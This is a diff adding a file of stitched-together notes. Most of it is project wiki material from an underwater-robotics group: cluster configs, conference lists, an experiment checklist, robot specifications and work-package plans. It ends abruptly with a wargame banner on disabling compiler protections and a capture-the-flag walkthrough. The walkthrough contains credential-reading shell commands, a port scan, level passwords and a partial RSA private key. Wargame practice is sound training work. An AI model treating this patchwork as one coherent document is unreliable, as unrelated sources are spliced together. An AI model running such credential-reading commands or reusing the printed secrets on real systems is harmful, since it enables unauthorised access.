@@ -1,0 +1,670 @@
+Example 9.2. An example ping cluster resource that checks node connectivity once every minute
+
+<clone id="Connected">
+   <primitive id="ping" provider="pacemaker" class="ocf" type="ping">
+    <instance_attributes id="ping-attrs">
+      <nvpair id="pingd-dampen" name="dampen" value="5s"/>
+      <nvpair id="pingd-multiplier" name="multiplier" value="1000"/>
+      <nvpair id="pingd-hosts" name="host_list" value="my.gateway.com www.bigcorp.com"/>
+    </instance_attributes>
+    <operations>
+      <op id="ping-monitor-60s" interval="60s" name="monitor"/>
+    </operations>
+   </primitive>
+</clone>
+
+sudo crm configure primitive ping provider="pacemaker" class="ocf" type="ping" instance_attributes id="ping-attrs" nvpair id="pingd-dampen" name="dampen" value="5s" nvpair id="pingd-multiplier" name="multiplier" value="1000" nvpair id="pingd-hosts" name="host_list" value="my.gateway.com www.bigcorp.com" operations id="ping-monitor-60s" interval="60s" name="monitor"
+
+sudo crm configure primitive virtual_public_ip ocf:heartbeat:IPaddr2 params ip="${IP_FLOAT}" cidr_netmask="24" op monitor interval="10s" meta migration-threshold="2" failure-timeout="60s" resource-stickiness="100"
+sudo crm configure primitive webserver ocf:heartbeat:nginx configfile=/etc/nginx/nginx.conf op start timeout="40s" interval="0" op stop timeout="60s" interval="0" op monitor interval="10s" timeout="60s" meta migration-threshold="10"
+
+sudo crm configure group virtual_public_ip ros ping
+
+
+sudo crm configure primitive ping ocf:pacemaker:ping params dampen="5s" multiplier="1000" host_list=10.250.3.105 op monitor interval=30s
+
+Mrs. Suresh will start by studying the system architecture and the current status of the software of a novel underwater robot, set up her work computer and get all necessary safety instructions.
+During the course of her internship she will support the software team in the implementation of new software functions. Mrs. Suresh will use the software framework ROS in connection with C++.
+She will close by documentating her results and cleaning the software and the work computer
+
+
+| [../Conferences Conferences]                | List of conferences relevant for this project      |
+| [../Writing Collecting literature]          | How to collect literature for referencing purposes |
+| [./OwnPublications Own Publications]        | Publications done in DAEDALUS                      |
+| [../../HowTo/WritingPapers How to write papers] | Tips and tricks on how to write papers         |
+
+
+|  2016-07-31 |  uAUV² - Development of a minuscule autonomous underwater vehicle |  Hendrik Hanff, Korbinian Schmid, Philipp Kloss, Sven Kroffke |   icinco2016 | [export:documentation/publications/Published/2016_ICINCO/Paper/uAUV2.pdf@HEAD PDF]  |
+|  2017-04-18 |  AUVx - A Novel Miniaturized Autonomous Underwater Vehicle |  Hendrik Hanff, Philipp Kloss, Bilal Wehbe, Peter Kampmann, Sven Kroffke, Aljoscha Sander, Miguel Bande Firvida, Maria von Einem, Jan Frederik Bode, Frank Kirchner |   Oceans 2017 | [export:documentation/publications/Accepted/2017_Oceans/Paper/hanff2017.pdf@HEAD PDF]  |
+
+
+# Conferences and Jounals
+## Welche Konferenz ist interessant
+[http://www.confsearch.org/](Konferenzen suchen)
+[http://www.wikicfp.com/cfp/call?conference=robotics](... oder im Wikicfp suchen)
+[http://www.ieee-ras.org/about-ras/ras-calendar](IEEE Robotics and Automation Society upcoming events
+
+
+Lashika zeigte mir die folgende Möglichkeit nach interessanten Konferenzen für ein Thema zu suchen:
+1. [Google Metrics besuchen]()https://scholar.google.com/citations?view_op=top_venues)
+1. Im Suchfeld z.B. "Robotics Control" eingeben
+1. Ein Klick auf den h-Index zeigt die besten Paper der Konferenz
+
+### Conferences
+| **Short Name** | **Full Name**                                                       | **Location**     | **Conference date** | **Submission deadline** | **Notification of Acceptance** | **Kommentar** |
+| :----- | :-----                      | :-----     | :----- | :----- | :----- | :----- |
+|[ICARSC](http://www.waset.org/conference/2017/11/paris/ICARSC/call-for-papers]  |International Conference on Autonomous Robot Systems and Communications |Paris | | | |Hier gibt es auch einen [](http://www.waset.org/conference/2017/11/paris/ICARSC/call-for-papers Unterwasser) Slot |
+|[ESC](http://www.embeddedconf.com/) | Embbedded Systems Conference                        | USA - Boston, Silicon Valley  | 3 times per year |  |  |  |
+|[ISMRE](http://www.icmre.org/)|International Conference on Mechatronics and Robotics Engineering   | | | | |
+|[ISR](http://conference.vde.com/ISR2016/Pages/CallforPapers.aspx)|International Symposium on Robotics ISR |Munich |21.–22. Juni 2016 |11. Januar 2016 |? |Sebi reicht mit Limes ein Paper ein |
+|[ICINCO](http://www.icinco.org/) |International Conference on Informatics in Control, Automation and Robotics |Lissabon |29.-31. July 2016 |March 8, 2016 |May 4, 2016 |Laut Jose eine bekannte Konferenz, Co-finanziert vom IEEE |
+|[ICRA](http://www.icra2016.org/) |International Conference on Robotics and Automation |Stockholm | | | | |
+|[IROS](http://www.iros2015.org/) |IEEE/RSJ International Conference on Intelligent Robots and Systems |Hamburg | | | | |
+|[Sensornets](http://www.sensornets.org/)      | Conference on Sensor Networks                                         |                    |  Q1 2016              |           |                     |                 |
+|[Space Solutions](http://www.european-space-solutions.eu/) | European Space Solutions                                              | Munich             |  Q4 2013              |           |                                  |Wurde am 12.09.13 von I. Scholz  in einer Mail empfohlen              |
+|[EWSN](https://www.cister.isep.ipp.pt/ewsn2015/)            | European Conference on Wireless Sensor networks                       | Oxford             |  Q1 2014              |           |         |                 |
+|[IPSN](http://ipsn.acm.org/2015/)           | International Conference on Information Processing in Sensor Networks |                    |                       |           |         |                 |
+|[SenSys](http://sensys.acm.org/2014/)         | The ACM Conference on Embedded Networked Sensor Systems               |                    |                       |           |         |                 |
+|[SNIGM](http://www.iet.unipi.it/snigm2014/)          | Workshop on Sensor Networks for Intelligence Gathering and Monitoring | Hasselt, Belgium   |  Q2 2014              |           |   |                 |
+|[PECCS](http://www.peccs.org/)          | International Conference on Pervasive and Embedded Computing and Communication Systems  | Angers, France   |  Q1 2015   |           |          |
+|[AUV](http://www.auv2016.org/) | Autonomous Underwater Vehicles 2016  | Tokyo, Japan   |  |           |          |
+
+### Journals
+| **Name** | **Kommentar** |
+| [Science Robotics](https://www.sciencemag.org/journals/robotics)| Empfohlen in einer EMail von Peter Kampmann  |
+| [HardwareX journal](http://www.journals.elsevier.com/hardwarex/ | im Web gefunden |
+
+
+
+
+# General guidelines on performing experiments =
+
+== Experiment documentation ==
+ * Documentation should be placed in ``` /mnt/research/projects/ongoing/ROBIN_19868/documentation/experiments/YYMMDD_Experiment_Name ```
+ * Please use the documentation template ``` /mnt/research/projects/ongoing/ROBIN_19868/documentation/experiments/TestDocumentationTemplate.md ```
+ * All documentation should be made such that it can be used for the [http://wiki.dfki.uni-bremen.de/index.php/Systemb%C3%BCcher Systembuch]
+ * Take pictures of the experimental setup (and any variations)
+
+## Pre experiment Checklist ==
+The AUVx is an underwater vehicle. Special care has to be taken to ensure that the AUVx will not get damaged during the experiment.
+4 eyes principle: One person prepares the AUVx for the experiment. Another person verifies that all preparations were taken out carefully
+
+| **Task to check** | **OK/nOK** |
+| Verify that all screws are fastened |  |
+| Verify that all internal color encoded power plug is plugged correctly. |  |
+| Check that the battery pack is fully loaded |  |
+| Check that the rubber gaiter and internal tubings are intact |  |
+| Thruster left forward |  |
+| Thruster left backward |  |
+| Thruster left speed sensor  (encoder) |  |
+| Thruster left inclination sensor (potentiometer) |  |
+| Thruster right forward |  |
+| Thruster right backward |  |
+| Thruster right speed sensor (encoder) |  |
+| Thruster right inclination sensor (potentiometer) |  |
+| Thruster top forward |  |
+| Thruster top backward |  |
+| Thruster top speed sensor (encoder) |  |
+| Thruster top inclination sensor (potentiometer) |  |
+| Peristaltic pump functional |  |
+| Rubber gaiter end stop switch functional |   |
+| Serial communication link is functional |  |
+| Optical communication link is functional |  |
+| Data from IMU is valid |  |
+| Pressure sensor functional |  |
+| Optically inspect the AUVx for abnormalties |  |
+| Verify that the external plugs are clean |  |
+| Verify that there is a little grease on the external plugs |  |
+| Positive buoyancy check |  |
+| Taring check |  |
+| "Auftriebskörper" needed? |  |
+| Check that the "Stopfen" is on the JTAG port |  |
+| Is the O-Ring mounted in the right plug? |  |
+| Is the O-Ring mounted in the left "Stopfen" |  |
+
+## Start it ==
+ 1. Perform steps for Experiment documentation
+ 1. Execute checklist
+ 1. Execute the experiment
+ 1. Note any events during the experiment
+
+## After you finish ==
+ * Document everything
+ * Timestamp it - check what time you are actually using, if you have to synchronize your experiment
+ * Put your result and a experiment description in the project's experiments folder:
+```
+project/documentation/experiments/YYYYMMdd_ExperimentOnTestingMyBrainfunction
+```
+ * Print the document out and stick it into the Systembuch
+
+
+# Employees
+| :----------- |
+|  Hendrik Hanff      |
+|  Pierre Willenbrock |
+|  Philipp Kloss      |
+|  Christian Schoo    |
+|  Kirill Markov      |
+|  Marko Jankovic     |
+
+# Students (with Students Contract) working for this project
+|  **Name**                       |  **Arbeitet auf**     |  **Mentor**     |
+| :----------- | :----------- |  :----------- |
+|  Simon Peter                      |  Limes                  |  Peter Kampmann   |
+
+# Software requirements
+
+# Styleguide
+
+Detailed Styleguide with examples:
+* Use doxygen for documentation
+* WIESE_research/projects/ongoing/DAEDALUS_15078/documentation/how-to_manual/software/styleguide_cpp
+* in doc/html/index.html are the HTML-files generated from the Styleguide.
+* Templates can be found in src/google. An example of Doxygen usage is in the header: src/google/07_comments.h
+* [MinimalDoxygen](./MinimalDoxygen) -- Minimal Doxygen Documentation for C/C++ files
+
+The most important things in the Styleguide:
+* 4 Spaces (No TABS!!!!) for indentation.
+* All blocks must start on a new line.
+* Classnames must start with a capital letter (class CamelCase;)
+* Filenames(of each class) must start with a small letter with underline between the elements of the classname (.cpp/.h): camel_case.cpp
+* Guards (ifndef-define-endif) must be uniquely defined: PROJECT_PATH_FILENAME_EXT
+
+See also [CPP-Cookbook](https://svn.dfki.uni-bremen.de/cpp_cookbook/wiki/cpp_main_page) (Doku-Links, Code-Schnippsel)
+
+
+
+# Lieferanten
+[VT Zerspanung in Stuhr, gut und günstig laut Sven Kroffke](http://www.vt-zerspanung.de/)
+[Bis heute immer zu teuer gewesen](http://www.technotools.de/)
+[Kurios bei Hamburg, eine empfehlung von Sven](http://www.kurios.de/)
+[Einfach mal anfragen. Vielleicht geht da ja was. Die Firma ist in Dibbersen, ca, 0.5h Fahrtzeit von hier.](http://stachlelektronik.de/leistungen-mechanische-produktion.php)
+
+Ansosnten [hier](https://svn.hb.dfki.de/trac/Workgroups/wiki/Firmen) nach Firmen suchen. Die Empfehlungen sind größtenteils veraltet.
+
+# AUVx
+## Systembeschreibung
+Das autonome Unterwasserfahrzeug (AUV) AUVx ist als miniaturisiertes
+Explorations- und Forschungsfahrzeug konzipiert. Seine Form ist speziell auf die Anforderung im
+EUREX Projekt angepasst: ein möglichst geringer Durchmesser um in das
+Unterwasserfahrzeug Leng zu passen. Die Strömungshülle wurde hydrodynamisch
+optimiert, um mit geringem Energieaufwand durch das Wasser fahren zu können. Das
+Fahrzeug ist mit einer Vielzahl unterschiedlicher Sensoren ausgestattet. Eine
+Kamera gestattet es sogar Bilderkennungsalgorithmen unter Wasser testen zu
+können. Im Szenario von EUREX muss das AUVx dazu in der Lage sein, die als
+Referenzpunkte fungierenden uGlider finden zu können und anschließend zum
+Ausgangspunkt zurückzukehren. Das AUV kann neben dem vollautonomen Betrieb auch
+als hybrid ROV mit einer optischen Kommunikation oder Kupferdrahtkabel aus der Ferne
+gesteuert werden.
+
+Eine Besonderheit des Fahrzeugs ist neben dem hohen Grad an Miniaturisierung ein Thrusterkonzept mit Magnetkupplungen. Dadurch ist der Antriebsmotor hermetisch gegen eindringendes Wasser geschützt. Die Kraft wird dabei magnetisch auf den Propeller übertragen.
+
+Das Fahrzeug wurde im Rahmen des Projektes DAEDALUS entwickelt und gebaut
+
+## Technische Daten
+
+| Parameter                | Wert  |
+| :---                | :---  |
+| Gewicht                | 2120g  |
+| Länge                  | 393mm  |
+| Höhe                   | ~188mm |
+| Breite                 | ~200mm |
+| Maximale Tauchtiefe    | 7,8m   |
+| Volumen aus CAD        |        |
+| Antrieb                | 3 am DFKI entwickelte Thruster mit Magnetkupplung. Der Antrieb erfolgt mit Hilfe von Maxon Getriebemotoren |
+| Maximalgeschwindigkeit | 0,5m/s |
+| Vertikalbewegung       | Mit Hilfe einer Tauchzelle kann die Position in der Wassersäule energieeffizient statisch gehalten werden |
+| Volumen Druckzelle     | 30g |
+| Akkulaufzeit           | 4h |
+| Akku                   | 9 NiMH Eneloop Akkus, 11,2V/2,3Ah |
+| IMU                    | 9DOF Sensor Stick: ADXL345 Beschleunigungssensor, HMC5883L Magnetometer, ITG3200 Gyro |
+| Drucksensor            | Freescale MPX5100DP, Sensitivität 45mV/kPa, Messbereich von 0 to 100kPa (4.5mV/cm) |
+| Kamera                 | 8MP Pi camera |
+| Kommunikation          | Optisch oder kabelgebunden |
+| Boardrechner           | Custom FPGA Board, DAEDALUS BaseBoard mit STM32 und Pi Zero |
+| Boardrechner           | Custom FPGA Board, DAEDALUS BaseBoard mit STM32 und Pi Zero |
+
+
+# Schülerpraktikum
+
+## Ablauf=
+1. KiCAD -> Hendrik Hanff
+1. FreeCAD -> Daniel Pizzutilo
+1. Arduino -> Felix Bernhard
+1. Turtlebot -> Hendrik Hanff
+1. Elektroniklabor -> Kirill Markov/Christian Schoo
+1. Mechanik -> Sven Kroffke/Daniel Pizzutilo
+
+
+## Mögliche Themen
+
+- Das hier https://www.heise.de/make/meldung/Augmented-Reality-aus-der-Ikea-Lampe-Raspi-macht-s-moeglich-4047460.html?wt_mc=rss.ho.beitrag.atom in Verbindung mit Robotern
+- https://www.monoprice.com/product?c_id=122&cp_id=12205&cs_id=1220502&p_id=13960&seq=1&format=2
+- https://www.ebay.de/itm/Eggbot-Sphere-Bot-Painting-Robot-Kit-DIY-Egg-Bot-BALL-EASTER-Christmas-CNC/222808147436?hash=item33e06685ec:g:~F0AAOSw4shX-54N
+- Inbetriebnahme der DAEDALUS Mikrofonplatine
+- http://www.bat-pi.eu/
+- MaXYposi
+- https://github.com/DD4WH/Teensy-Bat-Detector/wiki/Hardware
+- www.lakka.tv
+- Make Magazin durchsuchen
+- https://create.arduino.cc/
+- http://dangerousprototypes.com/blog/2018/03/20/ble-module-pcb-made-with-silver-pastelaser-printer/ mit https://kitspace.org/
+- https://www.open-electronics.org/15-practical-raspberry-pi-projects/
+- Turtlebot in Betrieb nehmen
+- Einen Roboter aus Robotik I in Betrieb nehmen
+- https://www.sparkfun.com/news/2787
+
+
+## Druckkammer
+- Vorstellungsrunde: Wer bin ich?
+- Objekte in der Druckkammer
+  - Erdnuss und/oder andere Nüsse
+  - Rohes Ei in Tupperdose
+  - Styoporbecher mit Namen der Kinder
+- Lustige Spiele:
+  - Wann-geht-was-kaputt-Lotto/Was-geht-kaputt-Wette
+- "Mitarbeit" beim Druckkammerversuch explizit gewünscht
+  - Heben und Senken des Deckels
+  - Verfahren des Deckels
+  - Verschrauben des Deckels
+  - Reinigen der Druckkammer
+    - Deckel und Druckkammer trocken wischen
+    - Deckel und Druckkammer mit Sprühfett einsprühen um Korrosion zu verhindern
+  - Ketten müssen für Peter hinter einem Bolzen gesichert sein
+  - Alle Gefäße (Eimer, Großer Vorratsbehälter etc.) müssen restlos geleert sein
+  - Der Deckel muss bis zum Anschlag zurück auf die Startposition gefahren werden
+
+
+# Tag der offenen Tür
+- Einfacher Standdienst Druckkammerlabor
+- Einladen: Alle Alumnis von der Kohltour Seite. Zusätzlich: Christoph Waldmann, Sebastian Meckel, Achim Kopf,
+
+# Zukunftstag
+## Ideensammlung
+- !BristleBot
+  - [Bristle Bot](https://www.youtube.com/watch?v=rUSTXUis_ys)
+  - [Brisle Bot LOL](https://www.sparkfun.com/news/1783)
+- Wasserrakete
+  - Nachteil: Ist eigentlich nicht dass, was wir hier jeden Tag machen: Rocket Science. Eigentlich machen wir RobotScience
+  - Sicherheit?
+  - Sicherheitsbeauftragten einweihen
+  - Schutzbrille, Schutzkleidung!
+  - DLR macht das auch -> Eventuell die kontaktieren?
+   - Bauanleitung von C. Schoo
+  [Compressed air rocket launcher](https://www.google.com/search?client=ubuntu&hs=Zxx&channel=fs&biw=1600&bih=899&tbm=isch&sa=1&q=compressed+air+rocket+launcher+bottle&oq=compressed+air+rocket+launcher+bottle&gs_l=img.3...47781.48879.0.49011.7.7.0.0.0.0.83.507.7.7.0....0...1c.1.64.img..6.1.82.RHyo7IiX-v4)
+- Raspberry Pi
+  - Linux installieren
+- Linux für Kinder
+- Mein privater 3D Drucker?
+  - Spielerei ausdrucken
+- Make Magazin durchgucken
+- Löten
+  - Schon mal gemacht
+- Arduino
+  - Setup Entwicklungsumgebung
+  - Erste Programmierschritte
+- CNC Fräse selber bauen
+  - http://www.piccolo.cc/
+  - Zeit wird wohl nicht reichen.
+  - Nur in Betrieb nehmen?
+  - Finanzierung?
+- Ein gutes Buch: [http://www.bimsev.de/n/userfiles/downloads/making_handbuch_online_final.pdf Making mit Kids]. Viele Inspirationen.
+- [FM Radio](http://electronics-diy.com/simple-fm-radio.php)
+- [Inspirationen von Makershed](http://www.makershed.com/collections/beginner)
+- [Einen kleinen Line Folloower bauen](https://hackaday.com/2015/11/07/hacklet-83-tiny-robot-projects/)
+- [2D Plotter](http://www.instructables.com/id/How-to-Make-Mini-CNC-2D-Plotter-Using-Scrap-DVD-Dr/step7/Processing-IDE-program-GCTRL/)
+- [Roboter bauen](https://www.sparkfun.com/news/2323)
+
+DFKI: Evaluate the functional synthesis diagram built by SENAI’s team, adding or removing functions if needed;
+
+
+Concept generation;
+- DFKI and SENAI: Elaborate parameters for concept generation;
+  - Input: Finished morphological matrix and QFD matrix;
+  - Output: Parameters for concept generation;
+- DFKI: Elaborate possible concepts for the inspection unit;
+  - Input: Finished morphological matrix and concept generation
+parameters;
+  - Output: Several concepts (at least 3) for the inspection unit, based on the solutions for the functions on the morphological matrix; Those concepts must include hardware block diagram for the electronics, simplified software/firmware block diagram and communication schemes;
+
+Performance analysis;
+-  DFKI and SENAI: Elaborate a main / integration criteria for the system (Cocoon and unit);
+  - Input: Informational report and Morphological Matrix;
+  - Output: The main / integration criteria defined;
+-  DFKI: Elaborate the criteria that will be used during the analysis of all concepts for the intervention unit with the aid of SENAI’s team;
+  - Input: Informational report and Morphological Matrix;
+  - Output: A written report describing the criteria elaborated;
+
+Selection of concepts and participating on conceptual design within the scope of a design workshop between Germany and Brazil.
+- DFKI: Collaborative work between DFKI and SENAI for the selection of the concepts that will be developed throughout the project for the unit;
+  - Input: Several concepts and criteria analysis for the inspection unit;
+  - Output: Three concepts for the inspection unit;
+
+
+D1: Send Technical report to SENAI CIMATEC.
+- DFKI: Written report with a compilation of all previous deliverables from WP1, which includes:
+  - DFKI’s version of the functional synthesis;
+  - The final version of the unit’s morphological matrix ;
+  - DFKI’s generated concepts for the intervention unit. These concepts must include hardware block diagrams for the electronics, simplified software/firmware block diagrams and communication schemes;
+  - A description of the items in the list of criteria for concepts selection;
+  - A thorough analysis of each intervention unit’s concept regarding the criteria;
+  - The three chosen concepts for the intervention unit;
+  - DFKI’s final considerations;
+
+Preliminary Design: DFKI will support and consult in the Preliminary Design Phase and the steps of test and evaluation as well as research and development in the areas of mechanics, embedded electronics and software. The steps involve support in the following responsibilities for the entire ROBIN project (Robot, Cocoon and Cleaning Tool):
+
+
+DFKI: Selection of electronic circuits topologies and definition of operation logic for the intervention unit;
+  - Input: The three concepts from the conceptual phase;
+  - Output:
+    -  Circuit schematics for the proof of concept electronic;
+    - Protocols for the communication between the intervention unit’s modules;
+    -  Protocols for the communication between the intervention unit and the cocoon;
+    -  Flowchart and/or block diagram describing the software on a higher level. UML diagrams may also be used.
+
+Functional virtual simulation;
+DFKI: Simulation of electronic circuit topologies;
+ Input: Circuit schematics;
+ Output: Simulation result, definition of approved circuits and a list of
+others that shall be confirmed by physical tests;
+
+
+Functional virtual simulation;
+- DFKI: Simulation of electronic circuit topologies;
+  - Input: Circuit schematics;
+  - Output: Simulation result, definition of approved circuits and a list of others that shall be confirmed by physical tests;
+
+Pre-selection of materials;
+- DFKI: A preliminary selection of materials needed for the first tests phase with electronics at high temperature and high pressure, PCB, resin, heatsink, thermal isolator;
+  - Input: Circuit schematics;
+  - Output: Preliminary list of materials of coating, covering materials and others that are deemed necessary;
+
+
+Structural pre-dimensioning;
+- DFKI: Build the preliminary circuits schematics and the layouts for the electronic boards; To give some advice to SENAI on which concerns the electrical and electronic devices to be installed on the intervention unit;
+  - Input: Preliminary list of electronic devices, coating, covering materials and preliminary mechanical CAD files of the intervention unit system ;
+  - Output: Preliminary schematics and layouts (2D and 3D) in conformity with the structural design for the intervention;
+
+Selection of components / vendors;
+- DFKI: Selection of electronics components for high temperature and high pressure, such as sensors, electrical actuators/motors, batteries, microcontrollers/microprocessors, development boards, capacitors, resistors, etc.;
+  - Input: Circuits schematics
+  - Output: Preliminary list of electronics components, datasheets and vendors.
+
+Robot's / Onshore Cocoon's FMEA and tests definition/specifications;
+DFKI: Collaborative work between DFKI and SENAI for the elaboration of a FMEA (Failure Modes and Effects Analysis) for the intervention unit;
+  - Input: The concepts carried out to the preliminary phase;
+  - Output: FMEA table;
+
+D2: Send Technical report to SENAI CIMATEC.
+- DFKI: CAD files for the PCBs with schematics and layouts in conformity with the structural design, on which concerns the intervention unit, for the POC; Written report with a compilation of all previous deliverables from WP2, which includes:
+  - Circuit topologies and schematics for the electronics;
+  - Unified Modelling Language (UML) descriptions of all software systems for the intervention unit, including control systems, algorithms and behaviour, which must be detailed enough for a posterior implementation using a programming language;
+  - Defined communication protocols between intervention unit modules and between intervention unit and cocoon;
+  - Simulation result, definition of approved circuits and a list of others that shall be confirmed by physical tests;
+  - Preliminary list of materials of coating, covering materials and others that are deemed necessary
+  - Preliminary list of electronics components and datasheets.
+  - Preliminary schematics and layouts (2D and 3D) in conformity with the structural design for the intervention;
+  - Detailed information about tests to perform with the electronic boards, BOM for the electronics tests;
+  - Software/firmware architecture to the POC;
+  - FMEA table
+  - Final DFKI considerations;
+
+WP3: Proof of Concept: Planning of proofs of concepts that must be carried out to validate the concepts proposed for prototypes. Carrying out the preliminary tests of the systems / subsystems / components of the System (Robot, Onshore Cocoon and Cleaning Tool) for validation of the concept. The steps involve the following responsibilities:
+
+
+
+Acquisition of PoC (Proof of Concept) materials;
+- DFKI: Acquisition of items from the BOM, such as PCB components, sensors, actuators/motor, power connections and others needed devices;
+  - Input: Electrical CAD files, electrical / electronic BOM;
+  - Output: Electronic devices and components bought;
+
+
+Testing, tuning and selection of technologies;
+- DFKI: Integration between the hardware designed by DFKI (PCB fabrication and system/PCB assembly) and the software/firmware written by SENAI; Functional bench tests and high pressure / temperature / vibration tests;
+  - Input: Electronic components, PCBs, SENAI’s software/firmware and DFKI lab equipment;
+  - Output: Detailed reports about the test procedures and results obtained;
+
+Electrical interface specification and requirements analysis.
+- DFKI: Analysis of test results and improvement suggestions;
+  - Input: Tests results;
+  - Output: Detailed report about the test analysis and possible improvements;
+
+D3: Send Technical report to SENAI CIMATEC.
+- DFKI: Written report with a compilation of all previous deliverables from WP3,
+which includes:
+  - Electronic devices and components bought;
+  - Detailed reports about the test procedures and results obtained;
+  - Detailed report about the test analysis and possible improvements;
+  - DFKI’s final considerations;
+
+WP4: Detailed Design: DFKI will support and consult in the Detailing Phase and the steps of test and evaluation as well as research and development in the areas of mechanics, embedded electronics and software. The steps involve support in the following responsibilities for the entire ROBIN project (Robot, Onshore and Offshore Cocoon and Cleaning Tool).
+
+
+DFKI: Perform revisions on the schematics and layouts based on the test analysis and build the final version of these for the intervention unit with the tests procedures of the electronic systems; Elaborate the final software/firmware architecture of the unit;
+  - Input: Written report from WP3;
+  - Output: Final layouts, schematics, 3D CAD models, tests procedures of the electronic systems and subsystems, diagram for connection among modules and other components and final software/firmware architecture;
+
+Specification of materials;
+o DFKI: Final selection of materials used in the unit (PCB, resin, heatsink, thermal isolator);
+  - Input: Preliminary list of materials and test results;
+  - Output: Final list of materials of coating, covering materials and others that are deemed necessary;
+
+
+Selection of vendors;
+- DFKI: Final selection of electronics components for high temperature and high pressure, such as sensors, electrical actuators/motors, batteries, microcontrollers/microprocessors, capacitors, resistors, etc.;
+  - Input: Final circuits schematics.
+  - Output: Final BOM of the unit’s electronics and vendors.
+
+D4.1: Send Technical report to SENAI CIMATEC (Regarding to Onshore Cocoon + Robot).
+- DFKI: CAD files for the PCBs with schematics and layouts in conformity with the structural design, on which concerns the intervention unit; written report with a compilation of all previous deliverables from WP4, which includes:
+  - Final software/firmware architecture;
+  - Final schematics and layouts from the 3D CAD files;
+  - Tests procedures of the electronic systems and subsystems;
+  - Diagram for connection among modules and other components;
+  - Final list of materials of coating, covering materials and others that are deemed necessary;
+  - Final BOM of the unit’s electronics and vendors.
+  - Final DFKI considerations;
+
+
+
+Displacement
+Power Consumption (BMS)
+Processing Unit
+Cocoon/Intervention Unit I/f
+Intervention Unit/Tool I/f
+Power Source
+Orientation between modules
+Orientation
+Leakage detection
+Diameter
+Identify well equipment
+Pressure
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few usefull tools which you can find
+ in the following locations:
+
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
+
+bandit0@bandit:~$ cd; cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+
+bandit1@bandit:~$ cd ~; cat ./-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+
+bandit2@bandit:~$ cd; cat spaces\ in\ this\ filename
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+
+bandit3@bandit:~/inhere$ cd ~/inhere/; cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+
+bandit4@bandit:~$ cd;  cd inhere/
+bandit4@bandit:~/inhere$ cat ./-file07 # Gefunden mit file ./*
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+
+cd ~/inhere; find . | xargs ls -la | grep 1033; cat ./maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+
+bandit6@bandit:/$ find . -size 33c | xargs ls -la | grep bandit7 | grep bandit6; cat ./var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+
+bandit7@bandit:/$ cat data.txt | grep millionth
+cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+
+bandit8@bandit:~$ cd; cat data.txt | sort | uniq -cu
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+
+bandit9@bandit:~$ cd; strings data.txt | grep "\=\=\="
+truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+
+bandit10@bandit:~$ base64 -d  data.txt
+The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+
+bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+
+bandit12@bandit:/tmp/hhanff$ cat data8.bin
+The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+ssh bandit14@localhost -i sshkey.private
+bandit14@bandit:~$ cat  /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+bandit14@bandit:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e |nc localhost 30000
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+bandit15@bandit:~$ openssl   s_client -connect localhost:30001 # Then paste last PW
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+bandit16@bandit:~$ nmap -sV -p 31000-32000 localhost
+bandit16@bandit:~$ openssl s_client -connect localhost:31790
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
